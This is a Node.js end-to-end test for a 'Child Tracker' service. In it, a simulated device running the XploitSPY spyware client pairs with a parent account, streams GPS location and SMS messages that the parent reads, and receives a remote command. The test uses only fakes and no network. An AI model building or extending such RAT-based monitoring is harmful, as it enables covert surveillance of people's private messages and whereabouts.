#!/usr/bin/env node
/**
 * End-to-end proof that Child Tracker pairing + real-time tracking work,
 * INCLUDING the quoted-id corruption the real XploitSPY client produced.
 *
 * Simulates the full chain against an in-memory db (same getSetting/setSetting
 * contract as db.js) + a fake socket.io — NO network, fast, deterministic.
 */
const assert = require('assert');
const ct = require('../services/childTracker');

// ── in-memory db (mirrors db.getSetting/setSetting) ──
const store = new Map();
const db = {
  async getSetting(k) { return store.has(k) ? store.get(k) : null; },
  async setSetting(k, v) { store.set(k, String(v)); },
};

// ── fake socket.io ──
function makeIO() {
  let connHandler = null;
  return {
    on(ev, fn) { if (ev === 'connection') connHandler = fn; },
    sockets: {},
    _connect(query) {
      const listeners = {};
      const socket = {
        id: 'sock-' + Math.random().toString(36).slice(2),
        handshake: { query },
        request: { connection: { remoteAddress: '::ffff:10.0.0.5' } },
        emit(ev, data) { (this._emitted = this._emitted || []).push({ ev, data }); },
        on(ev, fn) { listeners[ev] = fn; },
        _fire(ev, data) { if (listeners[ev]) listeners[ev](data); },
        _emitted: [],
      };
      connHandler(socket);
      return socket;
    },
  };
}

(async () => {
  const io = makeIO();
  ct.attach(io, db, () => {});

  // ── 1) A REAL XploitSPY client connects sending a JSON-QUOTED id ──
  //    (this is the exact corruption that used to break everything)
  const QUOTED = '"abc123def456"';
  const CANON = 'abc123def456';
  const socket = io._connect({ id: QUOTED, model: 'TECNO BF7', manf: 'TECNO', release: '12' });

  // give the async saveDevice/ensureClaimCode microtasks a tick
  await new Promise(r => setTimeout(r, 30));

  // The server must have emitted a claim_code to the device.
  const claimEmit = socket._emitted.find(e => e.ev === 'claim_code');
  assert(claimEmit && claimEmit.data && claimEmit.data.code, 'device did not receive a claim_code');
  const code = claimEmit.data.code;
  console.log('  device got claim code:', code);

  // Device record must be keyed CANONICALLY (no quotes) and marked online.
  assert(store.has('ct:dev:' + CANON), 'device record not keyed by canonical id');
  assert(!store.has('ct:dev:' + QUOTED), 'device wrongly keyed by quoted id');
  assert(ct.isOnline(QUOTED) && ct.isOnline(CANON), 'device should be online under both raw and canon id');

  // The claim reverse-map must store the CLEAN id.
  const claimTarget = await db.getSetting('ct:claim:' + code);
  assert.strictEqual(ct.normId(claimTarget), CANON, 'claim map not canonical');

  // ── 2) Device streams GPS + SMS in (as the APK does) ──
  socket._fire(ct.KEYS.location, { latitude: 6.5244, longitude: 3.3792, accuracy: 12, enabled: true });
  socket._fire(ct.KEYS.sms, { smslist: [{ address: '+2348012345678', body: 'Hi mum', type: 1, date: Date.now() }] });
  await new Promise(r => setTimeout(r, 30));

  // ── 3) Parent claims the device with the code ──
  const OWNER = 'parent-user-uuid-001';
  const claim = await ct.claimDevice(code, OWNER, "Tunde's phone");
  assert(claim.ok, 'claim failed: ' + JSON.stringify(claim));
  assert.strictEqual(claim.device.clientId, CANON, 'claimed device not canonical');
  console.log('  parent claimed device:', claim.device.clientId, '->', claim.device.nickname);

  // ── 4) Parent lists devices — MUST see it, online, with metadata ──
  const list = await ct.listDevicesForOwner(OWNER);
  assert.strictEqual(list.length, 1, 'parent should see exactly 1 device, saw ' + list.length);
  assert.strictEqual(list[0].clientId, CANON);
  assert.strictEqual(list[0].model, 'TECNO BF7', 'device metadata lost');
  assert.strictEqual(ct.isOnline(list[0].clientId), true, 'device should show ONLINE for the parent');
  console.log('  parent sees device online with model:', list[0].model);

  // ── 5) Real-time tracking: parent reads the streamed GPS + SMS ──
  const gps = await ct.getData(CANON, 'gps');
  assert(gps.length >= 1 && gps[0].latitude === 6.5244, 'GPS not readable by parent');
  const sms = await ct.getData(CANON, 'sms');
  assert(sms.length >= 1 && sms[0].body === 'Hi mum', 'SMS not readable by parent');
  console.log('  parent reads live GPS:', gps[0].latitude, gps[0].longitude, '| SMS:', JSON.stringify(sms[0].body));

  // ── 6) Command routes to the live socket by canonical id ──
  const cmd = ct.sendCommand(QUOTED, '0xLO', {});
  assert(cmd.ok, 'sendCommand should reach the online device');
  assert(socket._emitted.some(e => e.ev === 'order'), 'device never received the order');

  // ── 7) A later reconnect with the CLEAN id must NOT create a 2nd device ──
  io._connect({ id: CANON, model: 'TECNO BF7' });
  await new Promise(r => setTimeout(r, 30));
  const list2 = await ct.listDevicesForOwner(OWNER);
  assert.strictEqual(list2.length, 1, 'reconnect with clean id created a duplicate device');
  assert.strictEqual(list2[0].ownerUserId, OWNER, 'ownership lost on reconnect');
  console.log('  reconnect with clean id kept ONE device, ownership intact');

  console.log('\n✅ ALL CHILD TRACKER PAIRING + REAL-TIME TRACKING TESTS PASSED');
})().catch(e => { console.error('\n❌ TEST FAILED:', e.message); process.exit(1); });
